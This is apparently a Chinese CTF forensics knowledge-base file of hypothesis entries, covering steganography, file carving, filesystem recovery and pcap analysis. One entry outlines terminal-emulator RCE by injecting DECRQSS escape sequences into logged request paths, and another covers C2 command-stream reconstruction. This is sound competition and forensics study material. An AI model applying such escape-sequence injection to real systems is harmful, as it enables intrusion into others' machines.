---
verified: "2026-10-15 | 本地复跑：Python 3.12.13（struct 模块，Linux 容器），见条目1复跑记录"
status: verified
# status 取值：hypothesis（假设）| verifying（验证中）| verified（复跑通过）| refuted（证伪，需附失败原因）| inconclusive（证据不足挂起）；旧词映射 draft≡hypothesis、deprecated≡refuted（见 ../../shared/REFLIGHT.md §1）
source: "0rangec3t/Black-cat（假设-证据范式）、CTF-wiki（misc/取证）、M2 实测复跑（2026-10-15）"
changelog:
  - "[2026-11-02] v0.7：蒸馏 P4 批次并入 42 条（隐写主标 38 薄域优先 + 取证主标 8，hypothesis 待复跑；07 审阅 + 08 修正批已归零）｜源：ctf-corpus/distill/by-category/forensics/p4-20261030.md + candidates.jsonl（P4 批次报告 06、审阅报告 07、修正简报 08）"
  - "[2026-10-30] v0.6：蒸馏 P3 批次并入 40 条（中段困难档·薄域优先，hypothesis 待复跑）｜源：ctf-corpus/distill/by-category/forensics/p3-20261029.md + candidates.jsonl（P3 批次报告 02）"
  - "[2026-10-29] v0.5：蒸馏 P1+P2 批次并入 22 条（hypothesis 待复跑，REFLIGHT §1 二手知识纪律）｜源：ctf-corpus/distill 候选池（candidates.jsonl）+ distill/pilot/01-蒸馏批次报告-P2-20261029.md"
  - "[2026-10-15] 初始空壳，等待首个回流条目"
  - "[2026-10-15] v0.2：条目模板升级为五段式假设条目 + 机器可校验裁决词（REFLIGHT 回流协议，见 ../../shared/REFLIGHT.md）"
  - "[2026-10-15] v0.3：M2 填充 4 条（verified 1 / inconclusive 1 / hypothesis 2）"
  - "[2026-10-16] v0.4：「升级」字段边化——跳转目标改 [[条目名]] 图边引用（REFLIGHT §3）"
---

# 题型：Forensics

> 读取时机：pcap、磁盘/内存镜像、图片隐写、文件修复条目主库

## 填充规范（回流时遵守）

1. 条目模板 = 五段式假设条目：**假设 → 验证步骤 → 判定标准 → 裁决词 → 来源**（完整模板见 ../../shared/REFLIGHT.md §3），一技术一条目。
2. 裁决词只允许机器可校验标准词 **PASS / FAIL / INCONCLUSIVE**（词表见 ../../shared/REFLIGHT.md §2）；状态机：hypothesis → verifying → verified / refuted / inconclusive（§1）。
3. frontmatter 记录本文件最新验证状态：verified=最近一次复现日期+环境；source=条目主要出处；changelog 追加一行/次，不删除历史。
4. **失败样本优先回流**：refuted 条目必须附 FAIL 复跑记录、失败原因与"下一步转哪个新假设"，失败样本优先级高于成功经验。
5. verified/refuted/inconclusive 条目必须附复跑记录表（格式见 ../../shared/REFLIGHT.md §4）；未经复跑的条目状态只允许 hypothesis。
6. 工具具体用法归 ../../shared/tools/ 对应文件，此处不重复（去重原则）；五段式的「验证步骤」只保留最小可执行命令骨架。
7. 本文件超过 100 行时，在本节下方补 TOC 目录。

## 条目区（TOC）

1. [PNG chunk 解析定位尾随隐写](#png-chunk-解析定位尾随隐写)（verified）
2. [binwalk 多镜像/固件提取](#binwalk-多镜像固件提取)（inconclusive）
3. [JPG FFD9 尾部附加数据](#jpg-ffd9-尾部附加数据)（hypothesis）
4. [pcap HTTP 对象导出](#pcap-http-对象导出)（hypothesis）
5. [steghide 空口令隐写探测](#steghide-空口令隐写探测)（hypothesis）
6. [补条建议：编码套娃链识别与解链——链头数字标记密码类型](#补条建议编码套娃链识别与解链链头数字标记密码类型)（hypothesis）
7. [终端模拟器 DECRQSS 回显 RCE（日志注入转义序列）](#终端模拟器-decrqss-回显-rce日志注入转义序列)（hypothesis）
8. [ZFS 删除队列与快照恢复（lz4 压缩剥层）](#zfs-删除队列与快照恢复lz4-压缩剥层)（hypothesis）
9. [pcap DC++ 文件传输 TTH 哈希爆破补缺](#pcap-dc-文件传输-tth-哈希爆破补缺)（hypothesis）
10. [PNG IEND 尾随增量字节提取（逆写入器）](#png-iend-尾随增量字节提取逆写入器)（hypothesis）
11. [APNG 帧拆解重组（fdAT → IDAT 修正）](#apng-帧拆解重组fdat-idat-修正)（hypothesis）
12. [C2 指令流还原（双 ;;分隔协议 + push 分组过滤）](#c2-指令流还原双-分隔协议-push-分组过滤)（hypothesis）
13. [pcap 碎片合成 QR（HTTP 对象导出 + ImageMagick）](#pcap-碎片合成-qrhttp-对象导出-imagemagick)（hypothesis）
14. [音频信道分离 FSK 解调 + XOR 奇偶仲裁（SSTV 目标 CRC）](#音频信道分离-fsk-解调-xor-奇偶仲裁sstv-目标-crc)（hypothesis）
15. [TSPL 打印指令还原（BAR 矩形渲染取旗）](#tspl-打印指令还原bar-矩形渲染取旗)（hypothesis）
16. [多源碎片雕刻与权威哈希仲裁（NXFR 记录）](#多源碎片雕刻与权威哈希仲裁nxfr-记录)（hypothesis）
17. [Linux 内存镜像取证（banners 定版 → profile → 进程现场）](#linux-内存镜像取证banners-定版-profile-进程现场)（hypothesis）
18. [acropalypse 截图裁剪漏洞恢复（尾数据 + 尺寸差）](#acropalypse-截图裁剪漏洞恢复尾数据-尺寸差)（hypothesis）
19. [ISO→maildir→PGP→outguess 四段链取证](#isomaildirpgpoutguess-四段链取证)（hypothesis）
20. [OLE/Word97 头修复 + foremost 嵌套提取](#oleword97-头修复-foremost-嵌套提取)（hypothesis）
21. [BMP 位平面隐写读取（跟随写入器逻辑）](#bmp-位平面隐写读取跟随写入器逻辑)（hypothesis）
22. [hex 文本修复 JPEG + steghide 双层 + morse/ROT13](#hex-文本修复-jpeg-steghide-双层-morserot13)（hypothesis）
23. [文本空白字符隐写（空格/制表符二进制）](#文本空白字符隐写空格制表符二进制)（hypothesis）
24. [E01 取证镜像挂载与删除文件恢复](#e01-取证镜像挂载与删除文件恢复)（hypothesis）
25. [sqlmap 注入日志轨迹取证（服务端视角拼旗）](#sqlmap-注入日志轨迹取证服务端视角拼旗)（hypothesis）
26. [音频帧重排恢复（排列指示数组）](#音频帧重排恢复排列指示数组)（hypothesis）
27. [Mel 频谱图音频逆向（gif 条形图帧→db_to_power→mel_to_audio）](#mel-频谱图音频逆向gif-条形图帧db_to_powermel_to_audio)（hypothesis）
28. [变速语音回声伪影补偿（mpv 慢放参数陷阱）](#变速语音回声伪影补偿mpv-慢放参数陷阱)（hypothesis）
29. [NATO 音标拼读听录（leftbracket 占位词定位括号）](#nato-音标拼读听录leftbracket-占位词定位括号)（hypothesis）
30. [FPGA 比特流逆向（iCE40 IceStorm 工具链）](#fpga-比特流逆向ice40-icestorm-工具链)（hypothesis）
31. [GIF 近黑帧对 XOR 隐写（缺 finder QR 修复）](#gif-近黑帧对-xor-隐写缺-finder-qr-修复)（hypothesis）
32. [音频声道分工双载隐写（倒放频谱图 + LSB 载荷）](#音频声道分工双载隐写倒放频谱图-lsb-载荷)（hypothesis）
33. [DNS 间隙 Manchester 信标（查询长度二进制化）](#dns-间隙-manchester-信标查询长度二进制化)（hypothesis）
34. [列主序 LSB 扫描（Rows lie. Columns don't）](#列主序-lsb-扫描rows-lie-columns-dont)（hypothesis）
35. [PNG 尾 ZIP 多层嵌套（列主序 LSB→加密包→FSK+倒放摩尔斯）](#png-尾-zip-多层嵌套列主序-lsb加密包fsk倒放摩尔斯)（hypothesis）
36. [时间倒放摩尔斯（整段倒放·符号序反转）](#时间倒放摩尔斯整段倒放符号序反转)（hypothesis）
37. [元数据伪旗注释的格式校验防误信](#元数据伪旗注释的格式校验防误信)（hypothesis）
38. [EXIF 多字段散布 base64 片段重组（AI 注入诱饵免疫）](#exif-多字段散布-base64-片段重组ai-注入诱饵免疫)（hypothesis）
39. [zsteg 多通道输出甄别（真通道 + 字体文件第二跳）](#zsteg-多通道输出甄别真通道-字体文件第二跳)（hypothesis）
40. [频谱图高频区二进制读模（0.1+0.4x 秒网格 + 8bit 倒序）](#频谱图高频区二进制读模0104x-秒网格-8bit-倒序)（hypothesis）
41. [语音念码留白的哈希约束恢复（小写/大小写双 SHA1 夹逼）](#语音念码留白的哈希约束恢复小写大小写双-sha1-夹逼)（hypothesis）
42. [WAV 帧字节 LSB 流提取（wave.readframes 全帧低位）](#wav-帧字节-lsb-流提取wavereadframes-全帧低位)（hypothesis）
43. [像素位布尔运算隐写（跨通道位合成 !r&(g^b)）](#像素位布尔运算隐写跨通道位合成-rgb)（hypothesis）
44. [迷宫染色 QR 修复（非白即黑 + 邻接反色）](#迷宫染色-qr-修复非白即黑-邻接反色)（hypothesis）
45. [频谱图参数化清洗（audacity 线性尺度 + Hanning 窗模板）](#频谱图参数化清洗audacity-线性尺度-hanning-窗模板)（hypothesis）
46. [三维积木模型分层 QR（.lxf 专格式 + 视角拆解）](#三维积木模型分层-qrlxf-专格式-视角拆解)（hypothesis）
47. [镜头畸变 QR 还原（GIMP Lens Distortion 逆向试参）](#镜头畸变-qr-还原gimp-lens-distortion-逆向试参)（hypothesis）
48. [子图语义二分类重建 QR（87×87 比特矩阵）](#子图语义二分类重建-qr8787-比特矩阵)（hypothesis）
49. [IEND 尾注 Baconian 大小写编码（strings 尾扫 + 字母表二分）](#iend-尾注-baconian-大小写编码strings-尾扫-字母表二分)（hypothesis）
50. [零宽变体选择符隐写（VS17-256 偏移分组解码）](#零宽变体选择符隐写vs17-256-偏移分组解码)（hypothesis）
51. [EXIF Make 字段跨图序拼接（同字段跨文件 + zsteg 补刀）](#exif-make-字段跨图序拼接同字段跨文件-zsteg-补刀)（hypothesis）
52. [复合载体三段链（QR 扫描→ROT13→binwalk RAR→DTMF 解调）](#复合载体三段链qr-扫描rot13binwalk-rardtmf-解调)（hypothesis）
53. [Go 勒索器逆向 + 云端密钥端点定位（strings 锚点）](#go-勒索器逆向-云端密钥端点定位strings-锚点)（hypothesis）
54. [管理接口路径穿越自体提取（/proc/self/exe 落盘）](#管理接口路径穿越自体提取procselfexe-落盘)（hypothesis）
55. [文件描述符表共享上下文错配（dup 双挂 + 引用计数失衡）](#文件描述符表共享上下文错配dup-双挂-引用计数失衡)（hypothesis）
56. [SQL 调试日志暗格式还原（gzdeflate+b64 双层）+ DNS 外带痕迹重建](#sql-调试日志暗格式还原gzdeflateb64-双层-dns-外带痕迹重建)（hypothesis）
57. [逻辑分析仪会话封装还原（atkdl=zip+ini+通道 bin）](#逻辑分析仪会话封装还原atkdlzipini通道-bin)（hypothesis）
58. [编码器已知明文灌注（fake flag 回读推映射）](#编码器已知明文灌注fake-flag-回读推映射)（hypothesis）
59. [EEPROM 二次读取竞态绕过（TOCTOU 认证标记）](#eeprom-二次读取竞态绕过toctou-认证标记)（hypothesis）
60. [伪 .gz 自定义分片容器（magic 15141312 + 序号 + base64 片重组）](#伪-gz-自定义分片容器magic-15141312-序号-base64-片重组)（hypothesis）
61. [USB 数位板 HID 轨迹重建（Leftover Capture Data 字节序统计纠偏）](#usb-数位板-hid-轨迹重建leftover-capture-data-字节序统计纠偏)（hypothesis）
62. [千文件泥沙类型指纹漏斗（file+grep 单点筛选）](#千文件泥沙类型指纹漏斗filegrep-单点筛选)（hypothesis）
63. [JSON 载体图 XOR 计数器流水（相似度配对 + R 通道差分）](#json-载体图-xor-计数器流水相似度配对-r-通道差分)（hypothesis）
64. [ASCII 十六进制转储回译 pcap（xxd -r -p + 证书吊销定位）](#ascii-十六进制转储回译-pcapxxd--r--p-证书吊销定位)（hypothesis）
65. [单像素条带图维度重排（55440×1 因子穷举 reshape）](#单像素条带图维度重排554401-因子穷举-reshape)（hypothesis）
66. [钓鱼 DFIR 报告链（邮件→msc→VBScript 解混淆→白 EXE 黑 DLL→RAT）](#钓鱼-dfir-报告链邮件mscvbscript-解混淆白-exe-黑-dllrat)（hypothesis）
67. [DeepSound 音频隐写 hash 提取与离线爆破](#deepsound-音频隐写-hash-提取与离线爆破)（hypothesis）
68. [LSB 载体可见文字首字母口令 + DES 解密](#lsb-载体可见文字首字母口令--des-解密)（hypothesis）
69. [RAR 头修复 + Blue0 二维码 + USB 击键流量 + 栅栏重排](#rar-头修复--blue0-二维码--usb-击键流量--栅栏重排)（hypothesis）
70. [Base64 非规范尾差隐写（重编码差值藏比特）](#base64-非规范尾差隐写重编码差值藏比特)（hypothesis）
71. [PT2262 无线信号波形译码（脉冲宽度三元映射）](#pt2262-无线信号波形译码脉冲宽度三元映射)（hypothesis）
72. [伪加密 + Red7 通道藏图 + TTL 2bit + 大文字渲染四层链](#伪加密--red7-通道藏图--ttl-2bit--大文字渲染四层链)（hypothesis）
73. [三图尾随 zip 拼接 + base 家族自动侦测套娃解码](#三图尾随-zip-拼接--base-家族自动侦测套娃解码)（hypothesis）
74. [密码自递归嵌套 zip + RGB 像素流重绘二维码](#密码自递归嵌套-zip--rgb-像素流重绘二维码)（hypothesis）
75. [零宽 + morse 控制符 + NTFS 流 + 词频 + Encrypto 五层链](#零宽--morse-控制符--ntfs-流--词频--encrypto-五层链)（hypothesis）
76. [cloacked-pixel LSB 提取 + keyword 前置 Nihilist 替换](#cloacked-pixel-lsb-提取--keyword-前置-nihilist-替换)（hypothesis）
77. [剑龙隐写 pyc 切片 + 反编译异或 + 二次隐写](#剑龙隐写-pyc-切片--反编译异或--二次隐写)（hypothesis）
78. [TTL 高 2bit 隐写 + 伪加密 + 多层 urlsafe base64](#ttl-高-2bit-隐写--伪加密--多层-urlsafe-base64)（hypothesis）
79. [零宽字符隐写盲识别（vim 不可见字符定位）](#零宽字符隐写盲识别vim-不可见字符定位)（hypothesis）
80. [PNG 结构修复五重奏（CRC 爆破宽高 + IDAT 块名 + 7z→zip 头 + CRC ASCII + 片段全排列）](#png-结构修复五重奏crc-爆破宽高--idat-块名--7zzip-头--crc-ascii--片段全排列)（hypothesis）
81. [SQL 盲注流量还原（二分阈值拐点法）](#sql-盲注流量还原二分阈值拐点法)（hypothesis）
82. [AI 生图 PNG 元数据 Prompt/Negative Prompt 泄密](#ai-生图-png-元数据-promptnegative-prompt-泄密)（hypothesis）
83. [JPG 尾随 zip 切割 + 载体间隙明文口令 + Blue1 通道](#jpg-尾随-zip-切割--载体间隙明文口令--blue1-通道)（hypothesis）
84. [exiftool 时间戳作随机种子的像素坐标洗牌还原](#exiftool-时间戳作随机种子的像素坐标洗牌还原)（hypothesis）
85. [PNG 九点结构修复（签名/IHDR/sRGB/gAMA/IDAT/CRC/IEND 全错位）](#png-九点结构修复签名ihdrsrgbgamaidatcrciend-全错位)（hypothesis）
86. [Java 文字冒险静态数组提取 + 字符映射像素渲染](#java-文字冒险静态数组提取--字符映射像素渲染)（hypothesis）
87. [BMP 头跳过 + 8 字节组 LSB 流提取（zsteg/StegSolve 全盲区）](#bmp-头跳过--8-字节组-lsb-流提取zstegstegsolve-全盲区)（hypothesis）
88. [energetic pixels 能量像素隐写（busysteg 论文工具反演）](#energetic-pixels-能量像素隐写busysteg-论文工具反演)（hypothesis）
89. [PDF 多层 binwalk 提取 + 解压炸弹规避（-1 尺寸伪文件）](#pdf-多层-binwalk-提取--解压炸弹规避-1-尺寸伪文件)（hypothesis）
90. [Flash dump MKV 双音轨 + 2000Hz 正弦波摩尔斯 + base32 落图](#flash-dump-mkv-双音轨--2000hz-正弦波摩尔斯--base32-落图)（hypothesis）
91. [gpjb 四格式文件头切分（gif/png/jpg/bmp 拼接流）](#gpjb-四格式文件头切分gifpngjpgbmp-拼接流)（hypothesis）
92. [泄露截图 LSB 水印溯源（三通道 Plane0 + PK 嵌入）](#泄露截图-lsb-水印溯源三通道-plane0--pk-嵌入)（hypothesis）
93. [DTMF 双音多频拨号音译码 + 十进制流多跳解码](#dtmf-双音多频拨号音译码--十进制流多跳解码)（hypothesis）
94. [ADS-B 航空协议帧解密（pyModeS + tcp.payload 批量解帧）](#ads-b-航空协议帧解密pymodes--tcppayload-批量解帧)（hypothesis）
95. [冰蝎流量 + 线性光栅图五重采样还原（z 五重切片采样）](#冰蝎流量--线性光栅图五重采样还原z-五重切片采样)（hypothesis）
96. [HTTP 对象导出 + zip 伪加密 + base64 隐写 + DES 四跳链](#http-对象导出--zip-伪加密--base64-隐写--des-四跳链)（hypothesis）
97. [Windows 计划任务描述字段藏匿（Base64 + HTML Entity 双编码）](#windows-计划任务描述字段藏匿base64--html-entity-双编码)（hypothesis）
98. [加密 zip 字典爆破 + Minix 文件系统取证 + PNG magic 篡改修复](#加密-zip-字典爆破--minix-文件系统取证--png-magic-篡改修复)（hypothesis）
99. [Golly 元胞自动机 RLE 渲染（Game of Life B3/S23）](#golly-元胞自动机-rle-渲染game-of-life-b3s23)（hypothesis）
100. [内存 dump 无果时的 strings+URL grep 兜底路径](#内存-dump-无果时的-stringsurl-grep-兜底路径)（hypothesis）
101. [多时区日志归一化排序还原（sonar 十六进制字符流）](#多时区日志归一化排序还原sonar-十六进制字符流)（hypothesis）
102. [内存 dump 中 SSH 凭据链提取（跳板机场景）](#内存-dump-中-ssh-凭据链提取跳板机场景)（hypothesis）
103. [盲注 != 逐字符还原 + bzip2 CRC 30bit 补全 + zip/RAR 头连环修复](#盲注--逐字符还原--bzip2-crc-30bit-补全--ziprar-头连环修复)（hypothesis）
104. [EV3 蓝牙传感器流量四模式替换 + 网格重排成图](#ev3-蓝牙传感器流量四模式替换--网格重排成图)（hypothesis）
105. [多段链：DOC=ZIP + stegseek 爆破 + GBK 注释 + 像素逆变换（中文题）](#多段链doczip--stegseek-爆破--gbk-注释--像素逆变换中文题)（hypothesis）
106. [PNG→PDF→…→7z 六层套娃容器（polyglot 逐层剥离）](#pngpdf7z-六层套娃容器polyglot-逐层剥离)（hypothesis）
107. [巨幅图像逐列/逐行循环偏移对齐（np.roll 绿像素锚点搜索）](#巨幅图像逐列逐行循环偏移对齐nproll-绿像素锚点搜索)（hypothesis）
108. [PNG Thumbnail Image 残留泄露（alpha 剪切后原图缩略还原）](#png-thumbnail-image-残留泄露alpha-剪切后原图缩略还原)（hypothesis）

### PNG chunk 解析定位尾随隐写
- **假设**：PNG 文件结构为 `8 字节魔数 + [4B长度][4B类型][数据][4B CRC]`×N 直到 IEND → IEND 之后若仍有数据即手工附加的隐写内容（最简隐写形态），顺带可暴露 chunk 级异常（自定义类型/长度越界）。
- **验证步骤**：
  ```python
  # struct.unpack(">I") 逐 chunk 步进：off += 12 + len；遇 IEND 后 data[off:] 即尾随数据
  ```
  本机实测（2026-10-15）：构造 IEND 后附加 `flag{png_tr4il3d_d4t4}` 的 PNG，手工解析 chunk 链 `[IHDR, IDAT, IEND]`，IEND 偏移 59 字节处完整取出尾随 flag。
- **判定标准**：PASS = IEND 后存在可读/可解数据；FAIL = IEND 即文件尾（转 LSB/调色板/IDAT 压缩流分析）。
- **裁决词**：PASS
- **来源**：M2 实测复跑（evidence T4）；PNG 规范（ISO/IEC 15948 chunk 结构）
- **升级**：PASS 后对取出数据按 [[file + strings 零依赖侦察]] 二次识别嵌套文件；FAIL 转 LSB 与 CRC 校验新假设（改宽高隐写 CRC 必错）。
- **关键差异**：模型盲区——只顾像素不看结构；chunk 解析还能暴露"改宽高"隐写（IDAT 数据量与宽高不匹配）。

### 复跑记录（verified / refuted / inconclusive 必备，append-only）
| # | 日期 | 环境/靶场 | 命令或脚本 | 裁决词 | 工件路径 | 备注 |
|---|---|---|---|---|---|---|
| 1 | 2026-10-15 | 本地 Python 3.12.13 struct 手工解析 | 构造样本 + chunk 步进解析 | PASS | evidence/T4-pngtrail | IEND 偏移 59B，尾随 flag 完整取出 |

### binwalk 多镜像/固件提取
- **假设**：附件为固件/磁盘镜像/含嵌套文件的"图片" → binwalk 扫描魔数签名自动 carving 出嵌入文件（squashfs/zlib/压缩包等）。
- **验证步骤**：1) `binwalk <img>` 看签名命中表；2) `binwalk -e` 自动提取，`-Me` 递归；3) 对提取目录逐层 file。
- **判定标准**：PASS = 提取出嵌套文件并找到线索；FAIL = 无签名命中（转 raw 搜索字符串/熵分析）。
- **裁决词**：INCONCLUSIVE
- **来源**：binwalk 官方 README；CTF-wiki 取证工具
- （inconclusive 缺口清单）本机无 binwalk、无镜像样本；思路仅来自官方文档。替代路径（hypothesis）：file + 手写魔数扫描（`strings | grep` / python 逐偏移比对常见魔数表）可覆盖部分场景，待实测比对召回率。

### JPG FFD9 尾部附加数据
- **假设**：JPEG 以 `FF D9` 结尾 → 其后若有数据即附加文件（zip/文本/另一张图），与 PNG 尾随数据同型。
- **验证步骤**：1) 二进制中搜 `FF D9` 最后一次出现偏移；2) `dd if=chall.jpg of=tail.bin skip=<off+2> bs=1`；3) `file tail.bin`。
- **判定标准**：PASS = 尾部数据为可识别文件且含线索；FAIL = FFD9 即 EOF（转 EXIF、量化表异常、steghide）。
- **裁决词**：待复跑
- **来源**：JPEG 文件结构（ITU-T T.81）；CTF-wiki 图片隐写
- （可选）**关键差异**：缩略图/多帧 JPEG 会在中间出现 FFD9，必须取**最后一次**出现。

### pcap HTTP 对象导出
- **假设**：流量题的敏感数据在 HTTP 明文传输 → tshark 直接导出全部 HTTP 对象（文件/图片）比逐包阅读快一个量级。
- **验证步骤**：1) `tshark -r chall.pcapng --export-objects http,outdir -q`；2) 对 outdir 逐文件 file/grep flag 格式；3) 明文不在 HTTP 时查 DNS/ICMP 隐蔽信道。
- **判定标准**：PASS = 导出对象含 flag/关键文件；FAIL = 全加密（转 TLS keylog 导入或流统计）。
- **裁决词**：待复跑
- **来源**：tshark 官方手册（--export-objects）；CTF-wiki 流量分析
- （可选）**升级**：`-z conv,tcp` 先看会话分布（属 [[tshark 流量分析]] 用法），大流量会话优先——别按包序硬读。

### steghide 空口令隐写探测
- **分层**：简单档·可复现强
- **假设**：JPEG 隐写题在题面无任何口令提示时，**先试 steghide 空口令**（直接回车）——出题方常默认空口令；`steghide info` 即可确认嵌入（回显 embedded file 名/尺寸/`rijndael-128, cbc`/压缩标记），无需先盲扫全家桶。
- **验证步骤**：1) `steghide info img.jpg`（passphrase 留空回车）；2) 确认回显含 "embedded file" 字段；3) `steghide extract -sf img.jpg -xf shell.txt`（仍空口令）。
- **判定标准**：PASS = info 报告 embedded file 且 extract 成功；FAIL = 无嵌入或口令非空 → 转口令线索（题面/EXIF/资源段）或其他格式族（outguess/F5/LSB）。
- **裁决词**：待复跑
- **来源**：TrendMicro CTF 2019 Quals RE-100 尾环（shell.txt 1.2KB，rijndael-128 cbc 加密嵌入）｜p4｜raw/github-repos/p4/2019_trendmicro-quals_e_re-100.md（`steghide info` 完整回显在 WP，可对照重放）
- **关键差异**：p4 是"各种流行工具试尽"之后才命中 steghide 空口令——**基线检查应前置**（第一动作而非最后手段）；与现库 forensics 条目（PNG chunk/FFD9 尾附/binwalk）互补，不重叠。

### 补条建议：编码套娃链识别与解链——链头数字标记密码类型
- **分层**：简单档·可复现强｜**动作：关键差异补条**（熵控五问 Q1 判定为现有条目边界情况，不新建独立条目）
- **假设**：套娃链变体：密文**每块前缀数字即密码类型标记**（如 1=rot13、2=base64、3=caesar，自加密 50 轮）→ 解链无需频率/特征判型，按前缀路由解码器即可；密文常藏于 pcap 的非 HTTP 对象流（源码在导出对象里、密文在 Follow TCP Stream 里——双路都要看）。
- **验证步骤**：1) 观察密文头部「数字-字母串」交替模式；2) 按数字索引选解码器逐块剥；3) 终态以可读 flag 校验；4) pcap 场景先 Export Objects 拿加密器源码、再 Follow TCP Stream 找密文。
- **判定标准**：PASS = 按标记解完全链得旗；FAIL = 标记缺失 → 回退现库条目的特征判型路径。
- **裁决词**：待复跑
- **来源**：CSAW 2015 transfer（forensics 100p，541 solves）｜p4｜raw/github-repos/p4/2015_csaw_e_transfer.md（加密器 python 源码 + `enc_ciphers = ['rot13','b64e','caesar']` 全在 WP）
- **目标条目**：[[编码套娃链识别与解链]]（wtf 现库）——差异点：① 自描述链头标记；② pcap 场景「对象导出 + Follow Stream」双路取证动作。

### 终端模拟器 DECRQSS 回显 RCE（日志注入转义序列）
- **分层**：困难档·复合链
- **假设**：Web 服务把未过滤的用户输入（URL 路径）回显到终端日志，而旧版终端模拟器（zutty 0.12）实现 DECRQSS 时会把非法参数原样回显为可执行转义序列（CVE-2008-2383 xterm 同族、iTerm2 CVE-2022-45872 跨 14 年重犯）⇒ 在请求路径中注入 DCS $ q…ST 序列，令终端「自己向自己」发出命令实现 RCE；另第一问可由「卡死单线程 Rust 服务器」达成（fork 子进程 connect 后 sleep，父进程退出）。
- **验证步骤**：1) 从 Dockerfile 锁终端模拟器版本；2) 对照 upstream shortlog 定位修复 commit 与回显行为；3) 构造含 DCS $ q 的 GET 路径写入访问日志；4) 终端渲染时执行序列读取 chroot 外 flag。
- **判定标准**：PASS = 终端内触发命令执行拿到 flag（两问通吃）；FAIL = 版本已修（回显为 cancel 序列）→ 转单纯视觉伪造（光标回退重绘日志行 / Sixel 图片）仅取第一问。
- **裁决词**：待复跑
- **来源**：Hackergame 2024 动画分享（general）｜USTC-Hackergame（官方+选手，taoky）｜raw/github-repos/hackergame2024/2024_hackergame_h_cn-432868.md（DEF CON 31 两讲座索引与 payload 全量在 WP，本地 zutty 可重放）
- **陷阱备注**：ANSI/DCS 转义是「纯文本协议」里被忽视的执行通道——取证视角看日志时「眼见不为实」（回退序列可重写历史行）。

### ZFS 删除队列与快照恢复（lz4 压缩剥层）
- **分层**：困难档·复合链
- **假设**：ZFS 删除不即时清数据，先入 delete queue 保持事务一致性；镜像里 `zfs list -rt all` 暴露快照 `data@mysnap`（REFER 与父卷差值即隐藏占用）⇒ 被删文件藏在快照的 delete queue 对象中，dump 后还需剥开 lz4 压缩与间接块层才见明文。
- **验证步骤**：1) Ubuntu/PVE 自带 zfs.ko 挂载镜像（免 DKMS）；2) `zfs list -rt all` 确认快照；3) 对快照跑 `zdb -dddd` 定位 delete queue 对象编号并 dump；4) 识别 lz4 魔数与对象布局，解压得明文（第一问文本文件 / 第二问结构化对象再拼装）。
- **判定标准**：PASS = 两个被删文件内容完整恢复；FAIL = 对象在 dump 中只有引用计数 → 检查 dnode 遍历是否漏 SPA 层。
- **裁决词**：待复跑
- **来源**：Hackergame 2024 ZFS 文件恢复｜USTC-Hackergame（官方+选手）｜raw/github-repos/hackergame2024/2024_hackergame_h_zfs.md（zdb 命令序列与解压思路在 WP；本地 zpool 即可造样重放）
- **关联**：Q1 边界——同「镜像分层恢复」族 [[E01 取证镜像挂载与删除文件恢复]]，关键差异 = 事务性文件系统的删除语义与压缩层。

### pcap DC++ 文件传输 TTH 哈希爆破补缺
- **分层**：困难档·复合链
- **假设**：流量中两份 ADC/DC++ FileListing XML 对同名文件 fl3g.txt 给出相同 TTH 哈希但正文中无内容 ⇒ 已知 14 字节长度与 flag 格式先验，把未知字符做成小空间，爆破候选内容使 Tiger Tree Hash 命中目标 TTH。
- **验证步骤**：1) tshark 导出会话重组 XML；2) 比对两份 listing 的 TTH/Size 锁定目标；3) 按 flag{} 格式枚举未知 4 字节；4) base32(TTH) 与 pcap 记录比对。
- **判定标准**：PASS = 唯一命中还原文件内容；FAIL = TTH 空间超界 → 扩用 DC++ 协议侧其它字段（Size/CID）交叉。
- **裁决词**：待复跑
- **来源**：BITSCTF 2017 woodstock（pcap/OSINT 350）｜p4（波兰战队）｜raw/github-repos/p4/2017_bitsctf_h_woodstock.md（两份 FileListing XML 与爆破思路在 WP，TTH 本地可复算）
- **关联**：同「哈希先验约束爆破」思想 [[RSA 最低有效字节甲骨文（LSB×8 预算约束）]]——把搜索空间压到哈希可验证的小域。

### PNG IEND 尾随增量字节提取（逆写入器）
- **分层**：困难档·复合链
- **假设**：程序逐次调用图像库把 flag 字符追加写到 PNG 尾部（IEND 之后）⇒ 对每个 PNG 提取 IEND 后字节流并按调用序合并即得 flag；逆向 APK/二进制定位调用逻辑以确认拼接顺序。
- **验证步骤**：1) strings/binwalk 探 IEND 后尾数据；2) 逆向确认写入函数与字符顺序（含排序/编码变换）；3) 脚本批量提取全部 PNG 尾字节；4) 按序拼接校验 flag 格式。
- **判定标准**：PASS = 拼出合法 flag；FAIL = 尾数据带每文件异或/索引 → 按逆向出的变换先解码。
- **裁决词**：待复跑
- **来源**：picoCTF 2019 Investigative Reversing 1｜Dvd848（S1 扩容源）｜raw/github-repos/Dvd848/2019_investigative-reversing-1-md_h_investigative-reversing-1.md（逆向定位与提取代码在 WP）
- **关联**：升级 [[JPG FFD9 尾部附加数据]]/[[PNG chunk 解析定位尾随隐写]] 到「多文件增量」形态——关键差异 = 单文件尾数据 → 文件集按序拼接。

### APNG 帧拆解重组（fdAT → IDAT 修正）
- **分层**：困难档·单点
- **假设**：PNG 含 acTL/fcTL/fdAT 动画块且 CRC 被写坏（题目暗示手工构造）⇒ 手工遍历 chunk：fdAT 去头 4 字节序列号后视作 IDAT、配 IHDR/IEND 即成单帧 PNG，CRC 不校直接提取，逐帧解码拼 flag。
- **验证步骤**：1) PNG 签名后逐 chunk 打印 type/length；2) 对每个 fdAT 重打包成独立 PNG（IHDR+IDAT+IEND）；3) 批量解码；4) 帧序列即 flag 字符序。
- **判定标准**：PASS = 每帧可解码且序拼成旗；FAIL = 首帧 IDAT 缺失 → 用静态帧补齐再拼。
- **裁决词**：待复跑
- **来源**：ASIS CTF Finals 2016 p1ng｜p4（波兰战队）｜raw/github-repos/p4/2016_asis-final_h_p1ng.md（PHP 拆包函数全量在 WP，本地可重放）
- **关联**：与 [[PNG chunk 手工解析（python struct）]] 同族进阶——关键差异 = 动画块结构（acTL/fcTL/fdAT）与坏 CRC 容错。

### C2 指令流还原（双 ;;分隔协议 + push 分组过滤）
- **分层**：困难档·复合链
- **假设**： pcap 中 C2 通信为文本行协议（`;;` 分隔：bot id/指令/参数/SHA 校验）⇒ Wireshark 按 `tcp.flags.push == 1` 过滤导出 JSON，按流重组还原指令表，从 `download;;…;;/tmp/flag;;URL` 指令定位随后 HTTP 传输即 flag。
- **验证步骤**：1) tshark 过滤 push 分组导出；2) 解码 ;;字段（编码与同赛 Connection 题共用）；3) 重建指令时间线（ready/wait/accepted/download）；4) 按指令中 URL 追 HTTP 流取旗。
- **判定标准**：PASS = 完整指令表 + flag；FAIL = 分片跨段重组错位 → 按 seq 去重后重排。
